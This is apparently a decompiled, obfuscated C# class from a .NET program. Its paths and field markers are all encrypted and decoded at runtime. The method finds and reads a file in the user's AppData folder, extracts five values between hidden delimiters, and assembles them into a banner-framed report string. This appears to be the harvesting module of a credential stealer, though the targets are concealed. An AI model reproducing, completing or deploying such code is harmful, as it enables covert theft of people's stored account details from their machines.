using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

internal sealed class Class37
{
	public class Class38
	{
		[DebuggerNonUserCode]
		public Class38()
		{
		}

		[MethodImpl(MethodImplOptions.NoOptimization)]
		public object method_0()
		{
			object result = default(object);
			try
			{
				string string_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class9.smethod_0("l6nOycyvnLW4tn7Cys3Ir3aTloqXnMLeya2/1c3Nl6fW0b2mdqTXyKm7xNy2Cw==", "False") + FileSystem.Dir(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class9.smethod_0("l6nOycyvnLW4tn7Cys3Ir3aTloqXnMLeya2/1c3Nl6fW0b2mdqTXyKm7xNy2ZYTZ1cYL", "False"), (FileAttribute)0);
				string string_2 = method_1(string_);
				string text = method_2(string_2, Class9.smethod_0("aZDCzcBrGg==", "False"), Class9.smethod_0("eIaq2M6wlQw=", "False"));
				string text2 = method_2(string_2, Class9.smethod_0("dKPN18t2Dw==", "False"), Class9.smethod_0("Z3Whx7yfhB0=", "False"));
				string text3 = method_2(string_2, Class9.smethod_0("d6vUzcx5DA==", "False"), Class9.smethod_0("WWeYvaGPdis=", "False"));
				string text4 = method_2(string_2, Class9.smethod_0("U4Ket6mOoa+odC8=", "False"), Class9.smethod_0("Y3GdtbmaubzGqmUg", "False"));
				string text5 = method_2(string_2, Class9.smethod_0("cJ27zrhyEw==", "False"), Class9.smethod_0("VGKMpqR9cTA=", "False"));
				string text6 = (string_0 = ((Operators.CompareString(text3, "", false) == 0) ? (Class9.smethod_0("hJ+qsaOEn6qxo4SfwOHHudazyLaEn6qxo4SfqrGjhJ+qsQM=", "False") + "\r\n" + Class9.smethod_0("aqZim6B/prStrjx9sb6pgGVwd2lKZSw=", "False") + "\r\n" + Class9.smethod_0("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpkH", "False")) : (Class9.smethod_0("hJ+qsaOEn6qxo4SfwOHHudazyLaEn6qxo4SfqrGjhJ+qsQM=", "False") + "\r\n" + Class9.smethod_0("YaW2u7RWVyw=", "False") + text5 + "\r\n" + Class9.smethod_0("h8nY4JhfCA==", "False") + text + Class9.smethod_0("eAk=", "False") + text2 + "\r\n" + Class9.smethod_0("kMnG2sicw8aiegs=", "False") + text3 + "\r\n" + Class9.smethod_0("Z5Owt62GpKF+Vi8=", "False") + text4 + Class9.smethod_0("RmmRwaiYurzHbiA=", "False") + "\r\n" + Class9.smethod_0("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpkH", "False"))));
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_0 = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public string method_1(string string_0)
		{
			string result = default(string);
			try
			{
				StreamReader streamReader = new StreamReader(string_0);
				result = streamReader.ReadToEnd().ToString();
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public string method_2(string string_0, string string_1, string string_2)
		{
			string result = default(string);
			try
			{
				string[] array = Strings.Split(string_0, string_1, -1, (CompareMethod)0);
				string[] array2 = Strings.Split(array[1], string_2, -1, (CompareMethod)0);
				result = array2[0];
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string string_0;
}
